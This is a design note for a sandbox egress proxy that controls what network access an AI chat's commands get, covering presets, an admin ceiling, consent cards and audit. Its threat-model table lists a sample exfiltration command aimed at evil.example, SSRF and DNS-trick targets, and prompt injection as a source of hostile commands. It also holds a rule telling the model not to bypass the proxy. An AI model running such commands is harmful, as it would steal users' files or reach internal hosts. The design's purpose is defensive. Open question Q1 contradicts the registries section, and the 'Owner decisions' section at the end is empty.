# Sandbox network access through a guarded host proxy

Status: design note, 2026-10-30. Owner decisions are final; open questions are
marked **Open** with a recommendation. No product code in this change.

## Problem

A chat that runs commands in the Sandbox cannot install a package. `pip
install`, `npm install`, `go get` and `cargo build` fail, because the guest has
no network. That is the safe default, and it stays the default. But a model
that cannot fetch one dependency writes worse code, or asks the user to run
the command somewhere else, with no isolation at all.

The model chooses every command, and a command can be the result of a prompt
injection in a file or a web page. So network access for the sandbox must be
narrow by default, visible to the person, bounded by the administrator, and
audited.

## What the code does today (verified)

- **The guest has no network device.** The Cloud Hypervisor command line
  (`addons/sandbox/internal/sandbox/chv/vm.go`, `chArgs`) passes `--kernel`,
  `--disk`, `--fs`, `--vsock`, `--console` and `--serial off`, and no `--net`.
  The gVisor backend runs `runsc --network=none`
  (`gvisor/runsc_linux.go`) with a new network namespace in the OCI bundle
  (`gvisor/bundle.go`): loopback only. The sandbox README says the same:
  "The guest has no network device."
- **A port transport already exists.** `sandbox.Env.Ports` is a
  `map[int]PortHandler` (guest port to host handler; "empty means no
  network", `core/services/studio/sandbox/sandbox.go`). The guest agent reads
  `sandbox.ports=` from the kernel command line, listens on
  `127.0.0.1:<port>` in the guest, and forwards each connection to the host:
  over vsock under `chv` (`chv/ports.go`, at most 64 handler connections per
  sandbox), over a Unix socket under `gvisor` (`gvisor/ports_linux.go`). The
  agent closes a connection from any peer that is not the host.
- **The guest image is already set for a proxy.** `images/guest/Dockerfile`
  sets `HTTP_PROXY`, `HTTPS_PROXY` (and the lower-case forms) to
  `http://127.0.0.1:3128`, `NO_PROXY=localhost,127.0.0.1`, and writes the same
  proxy into `/etc/pip.conf`, apt and the system git configuration. A handler
  on guest port 3128 therefore sees all web traffic.
- **Production registers no port.** The runner
  (`core/services/studio/sandbox/runner/runner.go`, `ready`) builds
  `sandbox.Env{Store, Actor}` with no `Ports`. With no handler on 3128 the
  guest's connection closes at once. Only the conformance suite uses a proxy
  (`sbtest.ConnectProxy`, a test helper).
- **The SSRF guard of `web_fetch`** is `pkg/web/safehttp`, wired by
  `core/services/studio/webtools.go`. It resolves a name once, refuses the
  connection when any answer is not allowed, dials the checked address, and
  checks the socket address again in a `net.Dialer.Control` hook (DNS
  rebinding). `CheckURL` refuses userinfo, zones, non-canonical numeric hosts
  and `localhost`; `CheckRedirect` re-runs `CheckURL` on every hop.
  `Allowed(addr, allowPrivate)` blocks the cloud metadata addresses and the
  unspecified address always, and unwraps IPv4 inside IPv6 (mapped,
  compatible, NAT64, 6to4; Teredo refused). The address rules are
  `httpclient.IsPublicIP`. Today the guard is only reachable through
  `safehttp.Client`, an `http.Client`; the dialer is not exported.
- **The host backend** of the Sandbox and the chats' built-in `bash`
  (`core/services/studio/hostexec`) run commands on the server with the
  server's network. Nothing in this design can restrict them.

So the transport (guest loopback port to host handler, with no NIC) and the
guest configuration exist. What is missing is the handler, the policy, the
consent, the audit and the settings.

## Decisions (owner, final)

1. The guest keeps no network device. Egress is possible only through a
   guarded **host proxy**; it is the single path.
2. Three presets: **Off** (default), **Package registries only**, **Allow
   all**. "Allow all" means all **public** hosts. Private, loopback,
   link-local and cloud metadata ranges are always blocked, unless an
   administrator switch with a typed confirmation enables the private ranges.
   (Metadata stays blocked even then, as in `web_fetch`.)
3. Administrators set a **ceiling**: the highest preset any chat may use.
   Users and chats choose a preset up to the ceiling.
4. When the proxy blocks a host, an **approve-on-block card** appears in the
   chat: allow once, allow for this chat, deny. The ceiling bounds it.
5. The proxy **reuses the `web_fetch` SSRF guard**. DNS rebinding and
   redirects are handled by the same code path; there is no second guard.
6. Network settings are NOT workspace files: the sandbox can write the home,
   so a file there could be edited by the code it is meant to confine. The
   limits are runtime settings like the other `chats_*` settings
   (administrator, Settings > Tools); the choice of a chat lives in its chat
   record on the server. The `LocalAI/` folder holds no network file.
7. Card state persists, stored with the chat.
8. Distributed mode follows `.agents/distributed-state.md`; the mode is stated
   below.
9. Every allowed and blocked request is audited.

## Goals

- `pip install requests` works in a chat whose preset is "Package registries
  only", with no other change by the user.
- A host outside the preset pauses the command and asks the person, in the
  chat, once per host.
- The administrator can cap every chat with one setting and read who reached
  what.
- No new guard code for addresses, names or DNS.
- Same behaviour under `chv` and `gvisor`.

## Non-goals

- Network for the host backend or the built-in `bash`. They have the server's
  network; the UI says so and the settings show "does not apply".
- Inbound connections to the guest (servers that a user opens in a browser).
  The Preview pane design covers that.
- Raw TCP, UDP, ICMP, SSH (`git@...`), DNS from the guest. Only HTTP and
  HTTPS through the proxy.
- Network for MCP servers, connectors or `web_fetch`: they keep their own
  settings.

## Anti-goals

- **No NIC, no TAP device, no user-mode network stack** in the guest (no
  slirp, passt or gVisor netstack with a route out). A device is a second path
  around the proxy.
- **No TLS interception.** The proxy never holds a CA the guest trusts. It
  sees the CONNECT target and the TLS ClientHello, not the request.
- **No model-controlled policy.** No tool, argument, file the guest can write,
  or environment variable raises the preset or answers a card.
- **No wildcard or pattern rules** in phase 1. A rule is one host name and
  one port.
- **No second SSRF guard** and no copy of the address tables.

## Threat model

The attacker controls the commands in the guest (a prompt injection, a
malicious package's install script, a hostile file). The attacker may also
control a public DNS zone and public servers. The attacker does not control
the person's browser session or the administrator's settings.

| Threat | Example | Defence |
|---|---|---|
| **Exfiltration** of the user's files | `curl -T /workspace/home/secrets.txt https://evil.example` | Off by default. Registries preset admits only listed hosts. A blocked name is never resolved, so it does not leak through DNS. Uploads per call are capped (see Limits). The person sees each new host on a card. Residual risk is stated in the docs: a registry that takes uploads (`npm publish` with the attacker's token) and "Allow all" both permit exfiltration; the preset is the person's choice of risk. |
| **SSRF into the host network** | `http://10.0.0.5:8080/admin`, `http://127.0.0.1:8080/api/settings`, `http://169.254.169.254/` | `safehttp` address rules: private, loopback, link-local, CGNAT, reserved and metadata refused; IPv4-in-IPv6 unwrapped. **New:** the addresses of the node's own interfaces are refused even when public (the LocalAI API listening on `0.0.0.0` is reachable through the node's public address). |
| **DNS rebinding** | name answers public on check, private on connect | Resolve once, check every answer, dial the checked address; `Control` hook checks the socket address. The proxy never passes a name to a second resolver. |
| **DNS tricks** | `0x7f.1`, `2130706433`, `127.1`, `[::ffff:127.0.0.1]`, zones `%eth0`, trailing dot, IDN look-alikes, `localhost.` | `safehttp` host rules (canonical dotted quad only, no zones, `localhost` and `*.localhost` refused). Names are lower-cased, trailing dot removed, IDN shown as punycode on the card. |
| **Redirects** | registry host answers `302 Location: http://10.0.0.5/` | The proxy follows no redirect. The guest client follows it, which makes a new proxy request that goes through the same check (name, policy, addresses). For plain HTTP the proxy's `http.Transport` does not follow redirects either. |
| **Domain fronting** | `CONNECT pypi.org:443`, then TLS SNI or `Host` of another tenant of the same CDN | On port 443 the proxy reads the TLS ClientHello (no decryption) and refuses a tunnel whose SNI is missing or differs from the CONNECT host. The inner `Host` header is encrypted and cannot be checked; residual risk, stated. |
| **Proxy abuse** | non-TLS bytes in a 443 tunnel; CONNECT to port 22 or 25; scanning third parties under "Allow all"; smuggling a second request after CONNECT | Ports 80 and 443 only by default (`chats_egress_ports`). Port 443 tunnels must start with a TLS ClientHello. Plain HTTP: each request on a kept-alive connection is checked on its own; `Proxy-*` and hop-by-hop headers are dropped; a request whose `Host` differs from its absolute URI is refused. Rate limits per sandbox. |
| **Resource exhaustion** | thousands of CONNECTs, slow-loris, a 50 GiB download, card floods | Limits table below; cards deduplicated per host and capped per chat; verdicts cached per call to keep host-operation traffic bounded. |
| **Policy tampering** | the guest edits files in the home (mounted writable) to widen its own access | No network setting is a workspace file. Limits are administrator settings and the chat's preset lives in the chat record; both change only through an authenticated API call, never through the filesystem. |
| **Card spoofing** | a host name made to look like a sentence or a URL | The card shows the host and port as plain text, max 253 bytes, punycode form. |
| **Idle background processes** | `nohup curl ... &` that runs after the call ended | No call in progress means no live host operation, so every connection is blocked (reason `idle`) and counted; open tunnels are closed when the call ends. |

## Design

### 1. Shape

```
guest process ──► 127.0.0.1:3128 (guest agent) ──vsock / unix socket──►
  add-on: egress proxy handler (one per sandbox, port 3128)
     ├─ parse CONNECT / absolute-form request (limits, host rules)
     ├─ host op egress.check {host, port, kind} ──► LocalAI: policy, card, audit
     │      ◄── verdict: allow | block | ask (waits for the card)
     ├─ safehttp.Guard.DialContext (resolve once, check, dial checked addr)
     └─ pipe bytes (TLS SNI check on 443), count, close at end of call
  host op egress.audit (byte counts) at the end of the call
```

**Decision: the add-on process dials; LocalAI decides.** The Sandbox add-on
owns the sandboxes and the port handlers, and it runs on the node that runs
them. Host operations are JSON request and answer; there is no byte-stream
seam from an add-on to the host, and adding one only to move the dial to the
server would double the bytes over the carrier for no gain. The add-on links
the same Go module, so it imports `pkg/web/safehttp` directly. The policy,
the cards, the chat record and the audit stay in LocalAI, behind host
operations, so a hostile add-on argument cannot pick the chat or the user.

### 2. The guard, shared (`pkg/web/safehttp`)

Extract the dial path of `Client` into an exported type. `Client` uses it;
behaviour of `web_fetch` does not change.

```go
// Guard decides hosts and addresses and dials only what it checked.
type Guard struct{ /* policy, resolver, allowed func */ }

type GuardPolicy struct {
    AllowPrivate bool         // private, loopback, link-local; never metadata
    Ports        []int        // empty: 80, 443
    DenyAddrs    func() []netip.Prefix // new: the node's own addresses
}

func NewGuard(p GuardPolicy, r Resolver) *Guard
// CheckHost applies the host rules of CheckURL to a bare host and port:
// canonical literal, no zone, no numeric tricks, localhost, port allowed,
// literal address allowed. It does not resolve.
func (g *Guard) CheckHost(host string, port int) (canonical string, err error)
// DialContext resolves once, refuses when any answer is not allowed, dials
// the checked addresses with the Control hook. It returns the address used.
func (g *Guard) DialContext(ctx context.Context, network, addr string) (net.Conn, error)
func (g *Guard) WithAllowPrivate(bool) *Guard // a copy, for one verdict
```

- `Client.CheckURL` calls `CheckHost` after the scheme, userinfo and length
  rules. `Client`'s transport uses `Guard.DialContext`. `CheckRedirect` is
  unchanged. One code path for web_fetch and the proxy.
- `DenyAddrs` is new. The default lists the addresses of the node's
  interfaces (`net.InterfaceAddrs`, read again every 60 s) and the addresses
  of the host in the configured external base URL. **Open Q7**: apply it to
  `web_fetch` too (recommendation: yes; a fetch of the server's own public
  address is the same SSRF).
- `Allowed` stays the single address table. The error values stay; the proxy
  maps them to audit reasons.

### 3. Presets and the verdict (`core/services/studio/egress`)

A new package holds the policy and nothing that does I/O.

```go
type Preset string
const (
    PresetOff        Preset = "off"
    PresetRegistries Preset = "registries"
    PresetAll        Preset = "all"
)
func (p Preset) Rank() int // off 0, registries 1, all 2; unknown is off

type Request struct {
    Host string; Port int; Kind string // "connect" or "http"
    TLS  bool                          // CONNECT to a TLS port, or https
}
type Chat struct {
    Preset   Preset
    Rules    []Rule   // stored with the chat
    Once     []Rule   // granted "once" for the call in progress
}
type Rule struct {
    Host string; Port int
    Allow bool             // false: a remembered deny
    By string; At time.Time; Card string
}
type Settings struct {
    Ceiling Preset; AllowPrivate bool; Ports []int; ExtraRegistries []string
}
type Verdict struct {
    Action string // allow, block, ask
    Reason string // preset, rule, once, denied, ceiling, port, private, registries-tls, ...
    AllowPrivate bool // the dial may reach private addresses (only with the admin switch)
}
func Decide(s Settings, c Chat, r Request, registries Registries) Verdict
```

Order of `Decide` (first match wins):

1. Port not in `Settings.Ports`: block `port`.
2. A deny rule for host and port: block `denied` (no card again).
3. Effective preset `E = min(chat preset, ceiling)`.
4. Host is a registry host and `E >= registries`: allow `preset`, only when
   `TLS` (registry entries are HTTPS); a plain HTTP request to a registry is
   block `registries-tls`.
5. `E == all` and the host is not a private literal: allow `preset`. The
   address check at dial time still refuses private answers.
6. An allow rule or a once grant: allow `rule` / `once`, if the ceiling still
   admits the host (an allow rule never outlives a lowered ceiling: a stored
   rule for a public host needs ceiling `all`, for a registry host
   `registries`).
7. A card is possible (section 6): ask. Otherwise block `ceiling` or `off`.

Private addresses: with `chats_egress_allow_private` off, `AllowPrivate` is
always false. With it on, a verdict for a host that an administrator allowed
by a rule or a card answer carries `AllowPrivate: true`; the preset alone
never does (**Open Q4**). Metadata addresses stay blocked by `Allowed`.

### 4. The package-registry allowlist

An embedded file, `core/services/studio/egress/registries.json`, versioned
with LocalAI and reviewed like code:

```json
{"version": 1, "registries": [
  {"id": "pypi",     "title": "Python (PyPI)",     "hosts": ["pypi.org", "files.pythonhosted.org"]},
  {"id": "npm",      "title": "JavaScript (npm)",  "hosts": ["registry.npmjs.org", "registry.yarnpkg.com"]},
  {"id": "go",       "title": "Go modules",        "hosts": ["proxy.golang.org", "sum.golang.org"]},
  {"id": "crates",   "title": "Rust (crates.io)",  "hosts": ["index.crates.io", "static.crates.io", "crates.io"]},
  {"id": "rubygems", "title": "Ruby (RubyGems)",   "hosts": ["rubygems.org", "index.rubygems.org"]},
  {"id": "maven",    "title": "Java (Maven Central)", "hosts": ["repo.maven.apache.org", "repo1.maven.org"]}
]}
```

Rules for the list:

- Exact host names, port 443, HTTPS only. No wildcards.
- Only read endpoints of public registries. Upload hosts
  (`upload.pypi.org`) are not on it. Code hosting (`github.com`,
  `codeload.github.com`, `objects.githubusercontent.com`) is not on it: it
  takes pushes and serves any content. A package that downloads a release
  asset from there triggers a card (**Open Q1**).
- No distribution mirrors (apt): the guest user is uid 1000 without root and
  cannot run apt. No model hubs: large downloads, and not a package registry.
- Each entry has a test that the host is a valid name and on 443.
- **Maintenance:** a change is a pull request that edits the file and the
  docs table; the release notes list it. The administrator adds hosts with
  `chats_egress_extra_registries` (exact names; for example an internal
  mirror, which is private and so also needs the private switch). There is no
  remote update of the list.

The guest image gets three more lines so the tools use the registries and not
a direct VCS fetch: `GOPROXY=https://proxy.golang.org` (no `,direct`),
`GOFLAGS=-mod=mod`, `npm_config_proxy` / `npm_config_https_proxy` set to the
proxy. cargo and uv read `HTTPS_PROXY`. Tools that ignore proxy variables
fail, as today; the docs say so.

### 5. The proxy handler (add-on)

`addons/sandbox/internal/egress` (new, add-on side):

- **Registration.** The runner always registers guest port 3128 with the
  proxy handler on `Create` and `Resume`, so the port set never changes with
  the preset (`Resume` needs a handler for each port the sandbox was created
  with). Off is enforced by the verdict, not by removing the port. Sandboxes
  of an older add-on are removed at add-on restart, so there is no snapshot
  without the port.
- **The live call.** `runner.Manager` keeps the request in progress
  (`User`, `Conversation`, `Operation`) on the sandbox entry while `Run`
  holds the entry lock, and clears it after the checkpoint. The handler reads
  it per connection. No request: block `idle`, count it, no host operation.
  At the end of `Run`, every tunnel of that sandbox is closed.
- **Parsing.** `http.ReadRequest` with a 30 s deadline and a 16 KiB header
  limit. `CONNECT host:port`, or an absolute-form `http://` request. Anything
  else (origin-form, `https://` absolute form, `Upgrade`) is 400. The host goes
  through `Guard.CheckHost` first; a failure is block with the guard's reason
  and no host operation.
- **Verdict.** `egress.check` (section 7) with `{host, port, kind, tls}`.
  Allow verdicts are cached for the call in progress, keyed by host and port,
  for at most 30 s; block and ask are not cached, so a card answer applies
  at once.
- **Dial.** `Guard.DialContext` with the verdict's `AllowPrivate`. A resolve
  or address failure is audited (`resolve`, `private`, `self`, `metadata`).
- **CONNECT on 443.** After `200 Connection established`, peek the first
  record (max 16 KiB, 10 s): it must be a TLS ClientHello whose SNI equals the
  CONNECT host (case-insensitive). Otherwise close, audit `sni`. Then pipe.
  CONNECT on 80 is refused (plain HTTP uses the absolute form).
- **Plain HTTP.** Forward with an `http.Transport` that has `Proxy: nil`,
  `DialContext: guard`, no redirects, a fresh connection per host, and drops
  `Proxy-Authorization`, `Proxy-Connection` and hop-by-hop headers. Each
  request on a kept-alive guest connection is decided on its own.
- **Answers to the guest.** A block is `403` with `Content-Type:
  text/plain` and one line the model can read in the tool output:
  `Blocked by LocalAI: <host> is not allowed for this chat (<reason>). The
  user was asked.` or `... Ask the user to allow it.` Card wait timeout is
  `403` with `the user did not answer`.

Limits (constants in phase 1, with a test each):

| Limit | Value |
|---|---|
| Concurrent tunnels per sandbox | 32 (the guest agent caps all ports at 64) |
| New connections per sandbox | 20 per second, burst 40 |
| Concurrent tunnels per add-on process | 256 |
| Dial timeout | 10 s |
| Idle tunnel | 120 s with no bytes |
| Bytes from the guest per call | 64 MiB (upload cap; **Open Q6**) |
| Bytes to the guest per call | 4 GiB |
| Pending cards per chat | 3; one per host and port |
| Card wait inside a connection | 60 s, and never past the call's own timeout |

### 6. Approve-on-block card

A card is offered when step 7 of `Decide` is reached and all of these hold:

- A person watches: not a trigger or connector run, not a sub-agent
  (**Open Q5**). Then the block is plain and the tool output says so.
- The ceiling admits the host: ceiling `registries` offers a card only for a
  registry host (a chat on Off can approve `pypi.org`); ceiling `all` offers
  one for any host; ceiling `off` never offers one.
- For a private literal or a host whose answers are private (known after a
  first failed dial): only when `chats_egress_allow_private` is on, and only
  an administrator may allow.
- The chat has fewer than 3 pending cards, and no pending card for that host
  and port.

Flow:

1. `egress.check` returns `ask` with a card ID only after it stored the card
   in the chat (`state: pending`). Then it publishes the chat event
   `egress_consent {id, host, port, kind, tool_seq}` and waits (section 8).
2. The card shows: "A command in this chat wants to reach **host:port**."
   Buttons **Allow once** (for the command in progress), **Allow for this
   chat**, **Deny**. The ceiling and the preset are named in one line.
3. `POST /api/chats/{id}/egress/consent {id, decision: once|chat|deny}` by
   the chat's owner. It writes the decision to the card and, for `chat` and
   `deny`, a rule (deny is remembered for the chat so the host does not ask
   again). Then it sends the control message.
4. The waiting check answers allow or block; the connection proceeds or gets
   its 403.
5. A late answer (after the 60 s wait) still counts: `chat` stores the rule;
   `once` grants the host for the next call of the chat within 10 minutes.
   A card not answered when the chat's turn ends goes to `expired` (it stays
   visible, with "Ask again" in the network panel, which turns it into a
   rule).

Cards are stored with the chat, so a reload shows them in place: each card
has `tool_seq`, the transcript line of the `bash` call that asked, and the
UI renders it under that line. Card record:

```go
type EgressCard struct {
    ID, Host string; Port int; Kind string
    State string // pending, once, chat, denied, expired, refused (ceiling lowered)
    ToolSeq int64; AskedAt, AnsweredAt time.Time; AnsweredBy string
}
```

The chat keeps the last 50 cards; older answered cards are dropped (the audit
has them).

### 7. Host operations (new, `core/services/addons/hostops/engine_egress.go`)

Registered with prefix `egress.`. The default of `--addon-host-ops` gains
`sandbox=egress.`.

| Op | Scope | Feature | Args | Result |
|---|---|---|---|---|
| `egress.check` | `act` | `chats` | `{host, port, kind, tls}` | `{action, reason, allowPrivate, card?}`; may wait up to 60 s (spec `Timeout` 75 s) |
| `egress.audit` | `act` | `chats` | `{events: [{host, port, kind, verdict, reason, addr, bytesUp, bytesDown, durationMs, at}]}`, max 500 | `{}` |

- The chat is the `ResourceID` of the live envelope (the host put it there
  for the tool call), read through `InFlight.Lookup`, never from the
  arguments; `Call` gains `ResourceID`. The user is the envelope's actor.
  Arguments named `chat`, `user`, `preset`, `allow` are refused, as the
  broker already refuses identity names.
- `egress.check` writes the audit line of the verdict itself, so a blocked
  request is audited even when the add-on never sends `egress.audit`.
  `egress.audit` adds the byte counts and the dial outcome of allowed
  requests, and the `idle` blocks counted since the last call (sent at the
  start of the next call, since an idle sandbox has no live operation).

### 8. Distributed mode

Per `.agents/distributed-state.md`:

| State | Mode | Where |
|---|---|---|
| Ceiling, private switch, ports, extra registries | **shared** | runtime settings store, like the other `chats_*` settings |
| Chat preset, rules, cards | **shared**, durable | the chat record in the chat store (database in a cluster) |
| A pending card wait | **stateless per request** | the host-operation handler on the node that serves the add-on; it re-reads the card from the store |
| Card answer delivery | bus fast path + store | `POST .../consent` writes the store, then sends `ControlMsg{Egress}` on the chat bus; the waiting handler wakes on the message or on a 2 s re-read of the card, so a lost message costs at most 2 s |
| Audit | **shared** | database table in a cluster (`studio_egress_events`), JSON file under the data path in standalone, memory without one; like the host-exec audit |
| Audit pruning | **single-runner** | `advisorylock.TryWithLockCtx` daily tick, new key in `keys.go`, removes rows older than `chats_egress_audit_days` |
| Verdict cache, rate limits, tunnel counts | **documented per-instance** | the add-on process (the owner is a singleton); a cache entry lives at most 30 s and only within one call, so a setting change applies within 30 s on any node |

With `--addons-role frontend`, a frontend runs no proxy; the owner does. A
two-instance test (fakebus) shows a card answered through frontend B wakes
the check waiting on node A, and that the 2 s re-read wakes it when the bus
message is dropped. Standalone mode (no bus, no database) uses the in-process
bus and the JSON chat store, and behaves the same.

### 9. Settings

**Runtime settings** (administrator, `POST /api/settings`, read at each
check, no restart):

| Key | Type | Default | Validation |
|---|---|---|---|
| `chats_egress_ceiling` | `off` \| `registries` \| `all` | `off` | enum |
| `chats_egress_allow_private` | bool | false | turning it on needs `chats_egress_private_confirm: "I understand that commands can reach my private network"` in the same request, else 400; the phrase is not stored |
| `chats_egress_ports` | port list | `80,443` | `config.ParsePorts`; 22, 25 refused |
| `chats_egress_extra_registries` | list of host names | empty | `Guard.CheckHost` on each, max 64 |
| `chats_egress_audit_days` | int | 30 | 1 to 365 |

Lowering the ceiling applies at the next check (at most 30 s on a cached
allow); pending cards above the new ceiling become `refused`; stored rules
above it stay but do not apply (they show "above the limit").

**No per-user file.** The preset of a **new** chat is the instance default
`chats_egress_default` (an administrator setting, capped by the ceiling, `off`
unless set). A person changes the preset of one chat in that chat's network
panel; nothing about network access is kept in the workspace. A personal
always-allow list is not part of phase 1 (**Open Q2**).

**Per chat**: `ChatRecord.Egress {Preset, Rules, Cards}`, set by store
methods `SetEgressPreset`, `PutEgressRule`, `DeleteEgressRule`,
`PutEgressCard` in both chat stores (JSON and database), left alone by
`UpdateChat`, like `AddonsOff`. A forked chat copies the preset and the
allow rules, not the cards. Saved agents: **Open Q5**.

### 10. API surface

User routes (chats feature, the chat's owner only; another user's chat is
404):

| Route | Purpose |
|---|---|
| `GET /api/chats/{id}/egress` | `{preset, ceiling, effective, applies, applies_reason, registries:[{id,title,hosts}], rules, cards}`. `applies` is false when commands run on the host or no Sandbox serves `bash` |
| `PUT /api/chats/{id}/egress {preset}` | 400 `egress_above_ceiling` above the ceiling |
| `DELETE /api/chats/{id}/egress/rules/{host}/{port}` | remove an allow or deny rule |
| `POST /api/chats/{id}/egress/consent {id, decision}` | answer a card; `once` and `chat` for a private target need an administrator |

Events on the chat stream: `egress_consent` (a new card) and `egress_card`
(a card changed state), so every open tab updates.

Administrator routes:

| Route | Purpose |
|---|---|
| `GET /api/chats/admin/egress` | settings in force, the registries list with the extras, whether the Sandbox serves (and with which backend), counts of the last 24 h |
| `GET /api/chats/admin/egress/events?limit=&user=&chat=&verdict=&host=` | the audit, newest first, max 500 per page |

Per `.agents/api-endpoints-and-auth.md`: handlers in
`core/http/endpoints/studio/egress.go`, swagger `@Tags chats`, rows in
`RouteFeatureRegistry`, the `chats` entry of `/api/instructions` gains one
paragraph, docs pages below.

**MCP tools** (`pkg/mcp/localaitools`, per `.agents/localai-assistant-mcp.md`):

- `get_chat_egress` → `GET /api/chats/admin/egress` (read).
- `list_egress_events` → `GET /api/chats/admin/egress/events` (read).
- `set_chat_egress_ceiling` → `POST /api/settings` (`chats_egress_ceiling`,
  mutating, listed in `prompts/10_safety.md`).
- **Not** an MCP tool: `chats_egress_allow_private`. Its typed confirmation
  is a person's act in the UI, like `confirm-host` of the Sandbox
  (`uiOnly`). The route map in `coverage_test.go` says so.
- The user routes are not MCP tools: they are the user's own chat, as the
  other `/api/chats/{id}` routes.

### 11. What the model is told

- The Sandbox `bash` description (manifest) gets: "Network: only HTTP and
  HTTPS through the proxy the sandbox sets; other hosts are blocked unless
  the user allows them."
- When the Sandbox serves `bash`, the turn's tool note adds one line:
  `Network for commands: package registries only (PyPI, npm, Go, crates.io,
  RubyGems, Maven Central). A blocked host asks the user; do not try to get
  around the proxy.` or `Network for commands: off.` The line changes when
  the preset changes; it is in the refresh key of the note, not of the
  sandbox.
- The 403 body (section 5) is what the model reads after a block.

### 12. UI

- **Chat Tools menu** (where the Sandbox switch is): a "Network" row with a
  three-way control (Off, Package registries, All public sites). Options
  above the ceiling are disabled with "Limited by your administrator". The
  row is hidden when `applies` is false and replaced by "Commands run on this
  machine and use its network" when the host backend serves.
- **Network panel** (from the row): the allow and deny rules with remove
  buttons, and the cards of the chat.
- **Card** `NetworkConsentCard.jsx`, next to `CommandsConsentCard.jsx`,
  under the `bash` tool line given by `tool_seq`. Host in monospace,
  punycode form. Answered cards collapse to one line ("Allowed for this chat
  by you, 14:02").
- **Settings > Tools** (`BuiltinToolsSection.jsx` area): a "Sandbox network"
  group: the ceiling select, the ports, the extra registries, the registries
  list (read-only, from the API), the private switch with its warning and
  typed phrase, the audit retention, and a link to the audit table.
- **Settings > Tools > Network audit**: a table with filters.
- Locale keys under `chat.egress.*` and `settings.egress.*` in the 9
  locales.

## Docs

Docs ship with each phase (docs-with-code rule):

- `docs/content/features/addons.md`, Sandbox: a new "Network access"
  subsection: the proxy as the only path, presets, ceiling, cards, the
  registries table, limits, what fails (tools that ignore proxy variables,
  SSH remotes, raw sockets), residual risks (registry uploads, Allow all,
  inner Host header), and **Distributed mode: mode shared (settings, chat
  record, audit), single-runner (audit prune), per-instance (verdict cache,
  limits)**. The Host operations section lists `egress.check` and
  `egress.audit` and the new `--addon-host-ops` default.
- `docs/content/features/chats.md`, Running commands: the Network row, the
  card; the routes; "Commands on this machine"
  says the network settings do not apply there.
- The settings reference: the six `chats_egress_*` keys (`chats_egress_default` added).
- `addons/sandbox/internal/sandbox/README.md`, Network section: port 3128
  is now always registered by the add-on.

## Tests (Ginkgo)

- `pkg/web/safehttp`: `Guard.CheckHost` table (numeric forms, zones,
  `localhost`, trailing dot, IPv6 literals, ports); `DialContext` with a stub
  resolver: public then private answer (rebinding) refused, mixed answers
  refused, `Control` hook refuses a swapped address, `DenyAddrs` refuses the
  node's address; the existing `Client` specs pass unchanged (redirect to a
  private address still refused).
- `core/services/studio/egress`: `Decide` table over ceiling × chat preset ×
  rules × host class (registry, public, private literal, metadata) × port ×
  TLS; a lowered ceiling voids rules; the registries file parses, every host
  passes `CheckHost`, no wildcard, no upload host.
- Proxy handler (`addons/sandbox/internal/egress`), in-process with
  `net.Pipe` and a fake host-op engine: CONNECT allow and block; absolute-form
  HTTP; origin-form 400; SNI mismatch and non-TLS on 443 closed; a redirect
  answered by an upstream test server leads to a second request that is
  checked again; `idle` block with no call; tunnels closed at the end of
  `Run`; every limit; the 403 text; allow cache expires after 30 s; block not
  cached.
- Host ops: chat comes from the envelope's `ResourceID`; identity arguments
  refused; no live operation refused; `egress.check` audits a block on its
  own; scope and feature checks.
- Cards: dedupe, cap of 3, unattended chat gets no card, ceiling `off`
  gets no card, private target needs an administrator answer, late answers,
  expiry at turn end, persistence across a reload in both chat stores.
- Distributed: two studio services on one fakebus and one store: answer on B
  wakes A; dropped bus message wakes A within 2 s; settings change through
  one is seen by the other; audit prune runs on one leader.
- Settings: enum and port validation; private switch without the phrase is
  400; MCP route map and catalog tests updated.
- Sandbox integration (`sbtest`, skipped without `SANDBOX_TEST_IMAGE`): under
  `chv` and `gvisor`, `curl` through the proxy reaches a host test server
  (test guard treats its address as public); with preset off it gets the
  403 line; `pip download` from a local index exercises the proxy settings of
  the image.
- UI: Vitest for the card states and the Tools menu row; one Playwright run
  through a card answer.

## Phased plan

Each phase is one PR-sized step that leaves the branch working. Sizes: S
under 500 lines, M 500 to 1,500, L over 1,500 (code and tests).

1. **Guard extraction (S).** `safehttp.Guard`, `CheckHost`, `DialContext`,
   `DenyAddrs`; `Client` on top of it; tests. No user-visible change unless
   Open Q7 is accepted (then a docs line for `web_fetch`).
2. **Policy, storage, settings (M).** `core/services/studio/egress`
   (`Decide`, registries file), chat record fields and store methods in both
   stores, the six runtime settings with validation, the audit store. Docs: settings reference.
3. **Proxy and host ops (L).** `egress.check` (allow and block only, no
   card yet), `egress.audit`, `Call.ResourceID`, the `--addon-host-ops`
   default, the add-on proxy handler, port 3128 always registered, live call
   tracking in the runner, guest image lines, tool description and turn note.
   Presets work end to end. Docs: addons.md Network access, host ops,
   distributed mode.
4. **API, MCP, Settings UI (M).** User and admin routes, events, swagger,
   route registry, instructions, the three MCP tools, Settings > Tools group
   and audit table, Tools menu row and network panel. Docs: chats.md.
5. **Cards (L).** `ask` in `egress.check`, the wait and the bus control, card
   storage and expiry, the consent route, `NetworkConsentCard`, the
   two-instance tests, locales.
6. **Agents and unattended runs (S).** Per Open Q5: the saved-agent
   `network` field and the sub-agent rule.

## Open questions

| # | Question | Recommendation |
|---|---|---|
| Q1 | Put GitHub release and archive hosts (`github.com`, `codeload.github.com`, `objects.githubusercontent.com`) on the registries list? Many packages fetch binaries from them. | **Decided: yes (owner).** `github.com`, `codeload.github.com`, `objects.githubusercontent.com` and `raw.githubusercontent.com`see Owner decisions. |
| Q2 | A personal always-allow list? | Not in phase 1. Rules per chat plus the preset cover it. |
| Q3 | Sandbox code could edit a network file in the home. | **Decided (owner): no network file in the workspace.** Defaults are an administrator setting and the chat record. No read-only mount needed for this reason. |
| Q4 | With the private switch on, may a preset alone reach private addresses, or only explicit rules? | Only rules and card answers by an administrator. A preset never reaches the private network. |
| Q5 | Unattended runs and sub-agents: what policy? | Sub-agent: the parent chat's preset and rules, no cards (the block is in its output). Trigger and connector runs: a saved agent gets a `network` preset field (default off, capped by the ceiling); a run with no agent is off. |
| Q6 | Upload cap per call: 64 MiB, or configurable? | 64 MiB constant in phase 1; a setting later if the audit shows real need. It bounds exfiltration volume, not the risk. |
| Q7 | Apply the new self-address deny to `web_fetch` too? | Yes, in phase 1: it is the same SSRF, and the guard is shared. |
| Q8 | "Allow once" scope: one connection, or the rest of the command? | The rest of the command in progress (one `bash` call). One connection would ask again for every retry of pip. |
| Q9 | Remember a deny for the chat, or ask again next time? | Remember it; it is removable in the network panel. Re-asking is a nag vector. |
| Q10 | Should the card wait inside the open connection (60 s) or block at once and let the model retry? | Wait. `pip` continues by itself after the click; a timeout gives the 403 line and the late answer still applies. |


## Owner decisions (2026-10-30)

